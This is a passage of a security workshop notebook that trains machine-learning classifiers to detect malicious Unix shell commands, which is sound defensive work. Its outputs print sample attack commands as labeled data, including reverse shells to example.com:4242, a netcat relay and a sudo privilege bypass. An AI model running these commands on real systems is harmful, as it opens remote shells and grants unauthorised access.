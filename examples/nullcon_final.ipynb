{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<center>\n",
    "\n",
    "# Shell Language Processing: Parsing Unix Commands For Machine Learning\n",
    "\n",
    "### NullCon Berlin 2022\n",
    "\n",
    "\n",
    "**Dmitrijs Trizna**  \n",
    "Security Data Scientist @ Avast  \n",
    "*OSCP, GREM, GDAT, CCNA, CCSA*  \n",
    "</center>\n",
    "<!-- <center><img src=\"../img/Tux_wordcloud.png\" width=250></center> -->\n",
    "\n",
    "# Unreleased data potential\n",
    "\n",
    "We encounter numerous log collection hubs that lack enough analytics to infer necessary visibility out of acquired data. Often, TB of logs are collected to perform only a basic analytics, and considered to be used in an *ad hoc*, reactive manner - if investiagtion is needed. Example of valuable data without enough processing attention - auditd's `execve` syscall containing shell commandlines:\n",
    "\n",
    "<img src=\"../img/auditd_elastic_screen.png\" width=750>\n",
    "\n",
    "In this practice we will **not**:\n",
    "- Discuss telemetry infrastructure setup - so we do not cover e.g. `auditd` configuration. If you want a good starting point, use Florian's Roth configuration: TBD LIMK\n",
    "- Cover how to fetch this data to your analytical host - we do not cover specific tool API samples. We encountered such data stored in Elastic, Splunk, Spark clusters, and based on our observations data queries do not represent a challenge for practitioners.\n",
    "\n",
    "In this Notebook we will:\n",
    "\n",
    "* Work with sample Linux command datasets consisting from benign and malicious entries\n",
    "* Use `slp` (Shell Language Processing) and `scikit-learn` libraries to encode commands as a vectors\n",
    "* Use `scikit-learn` and `xgboost` libraries to create a Machine Learning models\n",
    "  * Train a supervised classifier\n",
    "  * Perform an anomaly detection\n",
    "* Figure out what works and don't work in security applied machine learning\n",
    "\n",
    "This material is prepared to be processed by audience without a specific background, but beneficial would be:\n",
    "- familiarity with conventional security and administration concepts, e.g. Linux environment, auditd telemetry\n",
    "- Python fundamentals\n",
    "\n",
    "# Loading data \n",
    "\n",
    "Let's load sample data used for this demo and take a look on it:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# NumPy: \"The fundamental package for scientific computing with Python\"\n",
    "# allows to work with vectors, matrices, etc., aka Linear Algebra\n",
    "import numpy as np\n",
    "\n",
    "# packages needed to fetch data\n",
    "import io\n",
    "import os\n",
    "import zipfile\n",
    "import requests\n",
    "\n",
    "# matplotlib and seaborn are famous libraries for graph plotting in Python\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "sns.set()\n",
    "\n",
    "# specifying a static random seed for reproducibility purposes\n",
    "RANDOM_SEED = 1337\n",
    "\n",
    "# benign command data samples\n",
    "benign = [x.strip() for x in requests.get(\"https://raw.githubusercontent.com/dtrizna/slp/main/data/nl2bash.cm\").text.strip().split(\"\\n\")]\n",
    "auditd_execve_sample = requests.get(\"https://raw.githubusercontent.com/dtrizna/slp/main/data/exeve_sample.log\").text.strip().split(\"\\n\")\n",
    "\n",
    "# malicious command dataset\n",
    "zraw = requests.get(\"https://github.com/dtrizna/slp/raw/main/data/malicious.zip\").content\n",
    "with zipfile.ZipFile(io.BytesIO(zraw)) as z:\n",
    "    with z.open(\"malicious.cm\", pwd=\"infected\".encode()) as f2:\n",
    "        malicious = [x.strip().decode() for x in f2.readlines()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Just 5 benign commands for example:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"sed 's/3d3d/\\\\n&/2g' temp | split -dl1 - temp\",\n",
       " 'tar [your params] |split -b 500m - output_prefix',\n",
       " 'split --lines=50000 /path/to/large/file /path/to/output/file/prefix',\n",
       " 'split -n2 infile',\n",
       " 'split -l 50000000 --filter=./filter.sh 2011.psv']"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "benign[-55:-50]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "... again just 5 commands, but known to be used for malicious purposes:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['bash -i >& /dev/tcp/example.com/4242 0>&1',\n",
       " '0<&196;exec 196<>/dev/tcp/example.com/4242; sh <&196 >&196 2>&196',\n",
       " 'python -c \\'import os; os.system(\"/bin/sh\")\\'',\n",
       " 'sudo -u#-1 /bin/bash',\n",
       " 'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe']"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "malicious[-55:-50]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In machine learning scientific community it is assumed to use $X$ as a notation for input data. When supervised algorithms are used, we need to specify label of data denoted by $y$ to train model. In this case we assign label $0$ to benign entries, and label $1$ to represent maliciousness:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# joining datasets together and assigning labels\n",
    "X = {}\n",
    "X[\"raw\"] = benign + malicious\n",
    "y = np.array([0] * len(benign) + [1] * len(malicious), dtype=int)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "According to our needs, we can continue with additional analysis of data, just for example - investigation of commandline lengths in the dataset:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1008x432 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(14,6))\n",
    "plt.hist([len(x) for x in X[\"raw\"]], bins=40)\n",
    "plt.yscale(\"log\")\n",
    "plt.xlabel(\"Length of command\")\n",
    "plt.ylabel(\"Count of commands (log)\")\n",
    "_ = plt.title(\"Distribution of command lengths across the dataset\", fontsize=16)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### `Task 1`: observe two commands that exceed lengths of 500 characters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "# YOUR CODE HERE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Data preprocessing for Machine Learning (ML) model\n",
    "\n",
    "When speaking about introducing ML stuff -- in the industry, tutorials, courses -- huge emphasis is made on ML models itself.\n",
    "\n",
    "For our point of view, however, data **preprocessing** step posses the highest psychological gap for practitioners (engineers, analysts) trying to weaponize their data. Machine Learning models expect encoded data -- numerical vectors -- as input for their functionality. \n",
    "\n",
    "High level example of classical Natural Language Processing (NLP) pipeline might look like:\n",
    "\n",
    "<img src=\"../img/nlp_pipeline.png\" width=700>\n",
    "\n",
    "Arguably, shell commandlines do not need a *cleaning* out of punctuation like many NLP applications, since shell syntax embeds large portion of epistemic knowledge within punctuation. However, you still might need to perform a different type of cleaning based on telemetry you receive, e.g. *normalization of domain names, IP addresses, usernames*.\n",
    "\n",
    "Crucial steps for processing textual data as a feature vectors are **Tokenization** and **Encoding**, which we discuss in detail below.\n",
    "\n",
    "Worth mentioning that over the years classical NLP applications developed many other techniques which are less relevant for shell telemetry and we ommit them for the purpose of this exercise.\n",
    "\n",
    "\n",
    "## Tokenization\n",
    "\n",
    "Pre-processing and encoding of data is highly dependant on field and specific data source. Tokenization represents an idea of *dividing any continuous sequence to an elemental parts* called tokens. Tokenization applied on shell syntax is significantly harder from what we see in natural languages and posses several challenges: \n",
    "\n",
    "- spaces are not always elemental separators\n",
    "- dots and commas have a dedicated meaning\n",
    "- specific values behind different punctuation symbols like dash, pipe, semicolon, etc.\n",
    "\n",
    "<img src=\"../img/commmand_tokenization_ambiguity.png\" width=700>\n",
    "\n",
    "There are two ways to approach this problem:\n",
    "\n",
    "1. use built-in `argc` segregation in `auditd` `EXECVE` syscall logging\n",
    "2. utilize custom tokenizer to do a data parsing involving a domain knowledge\n",
    "\n",
    "### 1. Utilization of `argc` and `aX` values in `auditd` logging\n",
    "\n",
    "Below is a sample of `auditd` telemetry, specifically `execve` call, representing an executed commands on the target machine:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['type=EXECVE msg=audit(1648482003.144:915): argc=2 a0=\"cat\" a1=\"audit.log\"',\n",
       " 'type=EXECVE msg=audit(1648482003.144:916): argc=3 a0=\"grep\" a1=\"--color=auto\" a2=\"argc\"',\n",
       " 'type=EXECVE msg=audit(1648482003.144:918): argc=2 a0=\"wc\" a1=\"-l\"',\n",
       " 'type=EXECVE msg=audit(1648482012.228:937): argc=2 a0=\"cat\" a1=\"audit.log\"',\n",
       " 'type=EXECVE msg=audit(1648482012.228:939): argc=3 a0=\"grep\" a1=\"--color=auto\" a2=\"argc\"']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "auditd_execve_sample[-5:]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Can you implement a function that acquire a sequence of tokens based on `execve` log message?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[['cat', 'audit.log'],\n",
       " ['grep', '--color', 'argc'],\n",
       " ['wc', '-l'],\n",
       " ['cat', 'audit.log'],\n",
       " ['grep', '--color', 'argc']]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def parse_auditd(execve_log):\n",
    "    # YOUR CODE HERE\n",
    "    return None\n",
    "    \n",
    "# TBD: remove in final version\n",
    "def parse_auditd(execve_log):\n",
    "    try:\n",
    "        arguments = execve_log.split(\"argc=\")[1].split()\n",
    "        argc = int(arguments[0])\n",
    "        cmd_tokens = [arguments[i+1].split(\"=\")[1].strip('\"') for i in range(argc)]\n",
    "        return cmd_tokens\n",
    "    except IndexError:\n",
    "        return []\n",
    "\n",
    "execve_tokens = [parse_auditd(cmd) for cmd in auditd_execve_sample]\n",
    "execve_tokens[-5:]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. Dedicated Tokenizer for commands\n",
    "\n",
    "However, in cases when we have commands as a continuous strings or we are not happy with `auditd` built-in partitioning, we need a different approach. We suggest using our own Tokenizer. Consider data in a format we received our data sets:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['bash -i >& /dev/tcp/example.com/4242 0>&1',\n",
       " '0<&196;exec 196<>/dev/tcp/example.com/4242; sh <&196 >&196 2>&196',\n",
       " 'python -c \\'import os; os.system(\"/bin/sh\")\\'',\n",
       " 'sudo -u#-1 /bin/bash',\n",
       " 'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe']"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "malicious[-55:-50]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can use `ShellTokenizer` class implemented as part of our Shell Language Processing tooklit:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Defaulting to user installation because normal site-packages is not writeable\n",
      "Requirement already satisfied: bashlex in /Users/dmitrijs.trizna/Library/Python/3.8/lib/python/site-packages (0.15)\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: You are using pip version 21.3.1; however, version 22.0.4 is available.\n",
      "You should consider upgrading via the '/Applications/Xcode.app/Contents/Developer/usr/bin/python3 -m pip install --upgrade pip' command.\n"
     ]
    }
   ],
   "source": [
    "open(\"slp.py\", \"w\").write(requests.get(\"https://raw.githubusercontent.com/dtrizna/slp/main/slp.py\").text)\n",
    "\n",
    "try:\n",
    "  import google.colab\n",
    "  IN_COLAB = True\n",
    "except:\n",
    "  IN_COLAB = False\n",
    "\n",
    "if IN_COLAB:\n",
    "    !pip install bashlex\n",
    "else:\n",
    "  code = os.system(\"python3 -m pip install bashlex\")\n",
    "  if code != 0:\n",
    "    os.system(\"python -m pip install bashlex\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Parsing in process: 12730/12730\r"
     ]
    }
   ],
   "source": [
    "from slp import ShellTokenizer\n",
    "\n",
    "t = ShellTokenizer(verbose=True)\n",
    "X[\"tokenized\"], X[\"counter\"] = t.tokenize(X[\"raw\"]) # takes ~45 s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This allows to achieve results in just 2 lines of code, and results preserve punctuation relevant for decision heuristics based on this data.\n",
    "For example, `openssl` that opens an encrypted network channel is a generally used legitimate command, however, given pipe of any shell interpreter obviously states malicious usage:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "12730\n",
      "['mkfifo', '/tmp/s', ';', '/bin/sh', '-i', '<', '>&', '|', 'openssl', 's_client', '-quiet', '-connect', 'example.com:4242', '>', ';', 'rm', '/tmp/s']\n"
     ]
    }
   ],
   "source": [
    "print(len(X[\"tokenized\"]))\n",
    "print([x for x in X[\"tokenized\"] if \"openssl\" in x and \"-connect\" in x][1])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We have proven that using a dedicated tokenizer for Shell commmandlines noticeably increase performance of Machine Learning pipelines. For more details, refer to our paper: [arxiv.org/abs/2107.02438](https://arxiv.org/abs/2107.02438)\n",
    "\n",
    "## Encoding\n",
    "\n",
    "Once we received a tokenized sequence of commands, we can proceed to represention of these sequences in a some way. There are multiple conventional ways to represent sequence of textual tokens as a numeric array, we will consider:\n",
    "\n",
    "- One-Hot\n",
    "- Bag-of-Words\n",
    "- Hashing trick Vectorizer\n",
    "- TF-IDF (Term frequency-inverse document frequency)\n",
    "\n",
    "A short TL;DR on aforementioned type intuitions. Consider following dataset:\n",
    "\n",
    "```\n",
    "1. I love dogs.\n",
    "2. I hate dogs and knitting.\n",
    "3. Knitting is my hobby and my passion.\n",
    "```\n",
    "\n",
    "Then [**One-Hot**](https://scikit-learn.org/stable/modules/generated/sklearn.preprocessing.OneHotEncoder.html) encoding looks like this:\n",
    "\n",
    "<img src=\"../img/enc_onehot.png\" width=500>\n",
    "\n",
    "\n",
    "Then [**Bag-of-Words**](https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.CountVectorizer.html) (BoW) (a.k.a. Term-Frequency (TF) in `sklearn`'s terminology) encoding looks like this:\n",
    "\n",
    "<img src=\"../img/enc_bow.png\" width=500>\n",
    "\n",
    "The [**HashingVectorizer**](https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.HashingVectorizer.html) allows to map dictionary of tokens to a map of hashed tokens, that drastically reduce memory demands and can produce other benefits for security related implementations [[Ceschin and Botacin, (2021)]](https://secret.inf.ufpr.br/2021/09/29/adversarial-machine-learning-malware-detection-and-the-2021s-mlsec-competition/).\n",
    "\n",
    "\n",
    "[**TF-IDF**](https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.TfidfVectorizer.html) is more sophisticated version of BoW, where appearance of word in other documents is taken into considerations:\n",
    "\n",
    "$$ \\texttt{TF-IDF} = \\dfrac{\\texttt{TF (a.k.a. Nr. of words)}}{\\texttt{Nr. of documents containing this word}}$$ \n",
    "\n",
    "In our sample dataset this would result in:\n",
    "\n",
    "<img src=\"../img/enc_tfidf.png\" width=500>\n",
    "\n",
    "TF-IDF on the contrary to One-Hot and BoW allows to emphasize tokens representative for current document and de-emphasize common tokens.\n",
    "\n",
    "### **sklearn** library with custom tokenizer:\n",
    "\n",
    "**HashingVectorizer** example:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.feature_extraction.text import HashingVectorizer\n",
    "\n",
    "shell_tokenizer = ShellTokenizer(verbose=False, debug=False)\n",
    "hv = HashingVectorizer(\n",
    "    lowercase=False,\n",
    "    tokenizer=shell_tokenizer.tokenize_command,\n",
    "    token_pattern=None,\n",
    "    n_features=500\n",
    ")\n",
    "X[\"HashingVectorizer\"] = hv.fit_transform(X[\"raw\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(12730, 500)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.        , 0.        , 0.        , ..., 0.        , 0.        ,\n",
       "        0.        ],\n",
       "       [0.21320072, 0.        , 0.        , ..., 0.        , 0.        ,\n",
       "        0.        ],\n",
       "       [0.17407766, 0.        , 0.        , ..., 0.        , 0.        ,\n",
       "        0.        ]])"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(X[\"HashingVectorizer\"].shape)\n",
    "X[\"HashingVectorizer\"][0:3].toarray()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### `Task 2`: use sklearn's **TfidfVectorizer** with `slp.ShellTokenizer` to encode data with TF-IDF:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "\n",
    "# YOUR CODE HERE\n",
    "X[\"TF-IDF\"] = None"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### TF-IDF & One-Hot - easy `slp` impelementation:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2022-04-07 14:55:59,060 root  INFO     [!] Starting TF-IDF encoding!\n",
      "2022-04-07 14:55:59,896 root  INFO     [!] TF-IDF encoding finished!\n",
      "2022-04-07 14:55:59,953 root  INFO     [!] Starting One-Hot encoding!\n",
      "2022-04-07 14:56:00,779 root  INFO     [!] One-Hot encoding finished!\n"
     ]
    }
   ],
   "source": [
    "from slp import ShellEncoder\n",
    "\n",
    "encoder = ShellEncoder(X[\"tokenized\"], X[\"counter\"], top_tokens=500, verbose=False)\n",
    "X[\"TF-IDF\"] = encoder.tfidf()\n",
    "X[\"One-Hot\"] = encoder.onehot()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(12730, 500)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.        , 0.17798415, 0.        , ..., 0.        , 0.        ,\n",
       "        0.        ],\n",
       "       [0.        , 0.05932805, 0.        , ..., 0.        , 0.        ,\n",
       "        0.        ],\n",
       "       [0.        , 0.0427162 , 0.        , ..., 0.        , 0.        ,\n",
       "        0.        ]])"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(X[\"TF-IDF\"].shape)\n",
    "X[\"TF-IDF\"][0:3].toarray()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(12730, 500)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0, 1, 0, ..., 0, 0, 0],\n",
       "       [0, 1, 0, ..., 0, 0, 0],\n",
       "       [0, 1, 0, ..., 0, 0, 0]])"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(X[\"One-Hot\"].shape)\n",
    "X[\"One-Hot\"][0:3].toarray()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "12730\n",
      "top -b -d2 -s1 | sed -e '1,/USERNAME/d' | sed -e '1,/^$/d'\n",
      "[[0.         0.17798415 0.         0.         0.         0.\n",
      "  0.         0.         0.         0.         0.         0.\n",
      "  0.         0.         0.         0.         0.         0.\n",
      "  0.         0.         0.         0.51508213 0.         0.\n",
      "  0.         0.         0.         0.         0.         0.\n",
      "  0.         0.         0.         0.         0.         0.\n",
      "  0.         0.         0.         0.         0.         0.\n",
      "  0.         0.         0.         0.         0.63147246 0.\n",
      "  0.         0.        ]]\n"
     ]
    }
   ],
   "source": [
    "print(len(X[\"raw\"]))\n",
    "print(X[\"raw\"][0])\n",
    "print(X[\"TF-IDF\"][0,0:50].toarray())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Supervised learning example: classification with cross-validation\n",
    "\n",
    "At this point Encoded data is ready to be processed by many Machine Learning models. So we should feed the data to the Neural Networks? **NO!**\n",
    "\n",
    "Don't go Neural Nets unless you know why you need Deep Learning. Deep Learning brings problems that usually blocks them to be deployed in production environment:\n",
    "\n",
    "- need large sample to learn a good distribution (read: need relatively huge amount of **labeled** data)\n",
    "- therefore: more suspectable overfitting to the training set\n",
    "- therefore: a lot of False Positive / False Negatives\n",
    "\n",
    "For classification the first choice to go is **Gradient Boosted Decision Trees (GBDT)** -- good realisation within `XGBoost` library:  \n",
    "[[Source: Borisov et al., \"Deep Neural Networks and Tabular Data: A Survey\", (Feb. 2022)]](https://arxiv.org/pdf/2110.01889.pdf)\n",
    "\n",
    "\n",
    "<img src=\"../img/xgboost_tabular_data.png\" width=800>\n",
    "\n",
    "Digging deeper on GBDT if you are interested: [1. Wiki.](https://en.wikipedia.org/wiki/Gradient_boosting) [2. Intuition & visualisations.](https://arogozhnikov.github.io/2016/06/24/gradient_boosting_explained.html) Shortly:\n",
    "\n",
    "<img src=\"../img/gbdt.png\" width=600><br>\n",
    "\n",
    "\n",
    "<img src=\"../img/ml_ifelse.png\" width=600>\n",
    "\n",
    "\n",
    "## Cross-Validation\n",
    "\n",
    "Cross-Validation represents a training setup under constraints of dataset size to evaluate performance of model.\n",
    "\n",
    "Generally, model training and evaluation on large datasets happens with the following data split:\n",
    "\n",
    "- training set - used for model training\n",
    "- validation set - used for model's configuration optimization\n",
    "- test set - final evaluation of model performance\n",
    "\n",
    "However, in our case data is sparse, therefore, we will use a cross-validation approach, where we do no use validation set, and perform a division of training and test sets in a multi-fold manner [[source]](https://subscription.packtpub.com/book/all_books/9781789617740/2/ch02lvl1sec08/k-fold-cross-validation):\n",
    "\n",
    "<img src=\"../img/cross_validation.png\" width=600>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HashingVectorizer:\n",
      "\tAverage accuracy   over all folds: 0.99\n",
      "\tAverage precision  over all folds: 0.89\n",
      "\tAverage recall     over all folds: 0.55\n",
      "\tAverage f1         over all folds: 0.67\n",
      "\tAverage roc_auc    over all folds: 0.95\n",
      "\n",
      "TF-IDF:\n",
      "\tAverage accuracy   over all folds: 1.00\n",
      "\tAverage precision  over all folds: 0.93\n",
      "\tAverage recall     over all folds: 0.57\n",
      "\tAverage f1         over all folds: 0.71\n",
      "\tAverage roc_auc    over all folds: 0.96\n",
      "\n",
      "One-Hot:\n",
      "\tAverage accuracy   over all folds: 1.00\n",
      "\tAverage precision  over all folds: 0.91\n",
      "\tAverage recall     over all folds: 0.59\n",
      "\tAverage f1         over all folds: 0.72\n",
      "\tAverage roc_auc    over all folds: 0.96\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from xgboost import XGBClassifier\n",
    "from sklearn.model_selection import cross_validate\n",
    "from sklearn.model_selection import StratifiedKFold\n",
    "\n",
    "metrics = [\"accuracy\", \"precision\", \"recall\", \"f1\", \"roc_auc\"]\n",
    "\n",
    "def print_scores(cv):\n",
    "    means = np.mean(list(cv.values()), axis=1)\n",
    "    [print(f\"\\tAverage {x[0].strip('test_'):<10} over all folds: {x[1]:.2f}\") for x in zip(cv.keys(), means) if \"test_\" in x[0]]\n",
    "    print()\n",
    "\n",
    "for key in [\"HashingVectorizer\", \"TF-IDF\", \"One-Hot\"]:\n",
    "    xgb_model = XGBClassifier(n_estimators=100, use_label_encoder=False, eval_metric=\"logloss\")\n",
    "    skf = StratifiedKFold(n_splits=5, random_state=RANDOM_SEED, shuffle=True)\n",
    "    cv = cross_validate(xgb_model, X[key], y, cv=skf, scoring=metrics)\n",
    "    \n",
    "    print(f\"{key}:\")\n",
    "    print_scores(cv)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Predicting 'always benign' (y==0) yields 99.03% accuracy.\n"
     ]
    }
   ],
   "source": [
    "from sklearn.metrics import accuracy_score\n",
    "always_benign = np.zeros(len(y))\n",
    "print(f\"Predicting 'always benign' (y==0) yields {accuracy_score(y, always_benign)*100:.2f}% accuracy.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "What are all the these metrics, really? \n",
    "\n",
    "Accuracy -- no questions -- how much of elements are correct. To understand other metrics -- we should consider this classification map [[source]](https://en.wikipedia.org/wiki/F-score):\n",
    "\n",
    "<img src=\"../img/tpfptnfn_map.png\" width=400><br>\n",
    "\n",
    "Then precision and recall as as follows [[source]](https://en.wikipedia.org/wiki/F-score):\n",
    "\n",
    "<img src=\"../img/precision_recall.png\" width=400>\n",
    "\n",
    "F1-score is a \"harmonic mean\" between precision and recall and is calculated as follows:\n",
    "\n",
    "$$ F1 = 2\\cdot\\dfrac{\\texttt{precision}\\cdot\\texttt{recall}}{\\texttt{precision}+\\texttt{recall}}$$\n",
    "\n",
    "### More on evaluation of ML models in infosec - ROC and detection rate at fixed False Positive threshold\n",
    "\n",
    "Oftentimes in security domain representing model's performance with F1-score or accuracy is too shallow. The best way to communicate performance of the model is to evaluate it given a fixed False Positive rate, to understand its practical utility. For that we will use [Receiver Operating Characteristic (ROC)](https://en.wikipedia.org/wiki/Receiver_operating_characteristic) and [Detection Error Tradeoff (DET)](https://scikit-learn.org/stable/auto_examples/model_selection/plot_det.html) curves."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.metrics import roc_curve, det_curve, confusion_matrix\n",
    "from sklearn.utils import shuffle\n",
    "\n",
    "def plot_confusion_matrix(preds, y_true, threshold=0.5, counts=False, ax=None):\n",
    "    y_pred = (preds >= threshold).astype(int)\n",
    "    cf_matrix = confusion_matrix(y_true, y_pred)\n",
    "\n",
    "    group_counts = [f\"{value:0.0f}\" for value in cf_matrix.flatten()]\n",
    "    group_percentages = [f\"{value:.2%}\" for value in cf_matrix.flatten()/np.sum(cf_matrix)]\n",
    "    groups = [\"True Negative\",\"False Positive\",\"False Negative\",\"True Positive\"]\n",
    "\n",
    "    if counts:\n",
    "        labels = [f\"{y}\\n{x}\\n{z}\" for x,y,z in zip(group_percentages, groups, group_counts)]\n",
    "    else:\n",
    "        labels = [f\"{y}\\n{x}\" for x,y in zip(group_percentages, groups)]\n",
    "    labels = np.asarray(labels).reshape(2,2)\n",
    "    \n",
    "    if not ax:\n",
    "        _, ax = plt.subplots(1,1, figsize=(6,6))\n",
    "    ax = sns.heatmap(cf_matrix, annot=labels, ax=ax,\n",
    "                fmt='', cbar=False, cmap='Blues',\n",
    "                xticklabels=[\"benign\", \"malicious\"],\n",
    "                yticklabels=[\"benign\", \"malicious\"])\n",
    "    ax.set_ylabel(\"Ground truth label\")\n",
    "    ax.set_xlabel(\"Prediction\")\n",
    "    ax.set_title(f\"Confusion matrix with threshold: {threshold}\", fontsize=12)\n",
    "\n",
    "def plot_roc_metrics(preds, y_true, metrics, name, ax=None):\n",
    "    metrics[\"fpr\"][name], metrics[\"tpr\"][name], metrics[\"threshold_roc\"][name] = roc_curve(y_true, preds)\n",
    "    _, metrics[\"fnr\"][name], metrics[\"threshold_det\"][name] = det_curve(y_true, preds)\n",
    "    if ax:\n",
    "        ax.plot(metrics[\"fpr\"][name], metrics[\"tpr\"][name], linestyle=\"solid\", label=name)\n",
    "        ax.set_xlabel('False Positive Rate')\n",
    "        ax.set_ylabel('True Positive Rate')\n",
    "        ax.set_ylim([0.9,1.02])\n",
    "        ax.set_xlim([-0.05,0.25])\n",
    "        ax.set_title(\"ROC curve\", fontsize=12)\n",
    "        ax.legend(loc=\"lower right\")\n",
    "    return metrics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x432 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from collections import defaultdict\n",
    "metrics = defaultdict(dict)\n",
    "\n",
    "fig, ax = plt.subplots(1,2, figsize=(12,6))\n",
    "for key in [\"One-Hot\", \"HashingVectorizer\", \"TF-IDF\"]:\n",
    "    \n",
    "    xgb_model = XGBClassifier(n_estimators=100, use_label_encoder=False, eval_metric=\"logloss\")\n",
    "    xl, yl = shuffle(X[key], y, random_state=RANDOM_SEED)\n",
    "    xgb_model.fit(xl, yl)\n",
    "    preds = xgb_model.predict_proba(xl)[:,1]\n",
    "    \n",
    "    metrics = plot_roc_metrics(preds, yl, metrics, name = key, ax=ax[1])\n",
